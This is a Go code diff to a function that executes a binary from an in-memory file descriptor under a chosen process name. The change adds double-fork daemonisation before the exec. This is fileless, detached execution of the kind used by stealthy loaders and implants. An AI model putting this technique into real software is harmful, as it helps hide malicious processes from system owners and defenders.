@@ -53,11 +53,35 @@ func ExecMemfd(fd int, procname string) {
 	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
 	args := [1]string{procname}
 	env := os.Environ()
-	attr := &syscall.ProcAttr{Dir: "/proc/self/fd", Env: env}
-	pid, err := syscall.ForkExec(filepath, args[:], attr)
+	id, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
+	if id < 0 {
+		os.Exit(0)
+	} else if id > 0 {
+		os.Exit(0)
+	}
+
+	// Set SID and Fork Again
+	_, err := syscall.Setsid()
+	if err != nil {
+		fmt.Println("SetSID Failed")
+	}
+
+	id, _, _ = syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
+	if id < 0 {
+		os.Exit(0)
+	} else if id > 0 {
+		os.Exit(0)
+	}
+
+	// Set new Perms
+	syscall.Umask(0)
+	syscall.Chdir("/")
+
+	// Execute
+	fmt.Printf("[+] PID Spawed : %v\n", unix.Getpid())
+	err = syscall.Exec(filepath, args[:], env)
 	if err != nil {
 		fmt.Printf("Error Forking Process : %v", err)
 		unix.Exit(0)
 	}
-	fmt.Printf("[+] PID Spawed : %v\n", pid)
 }
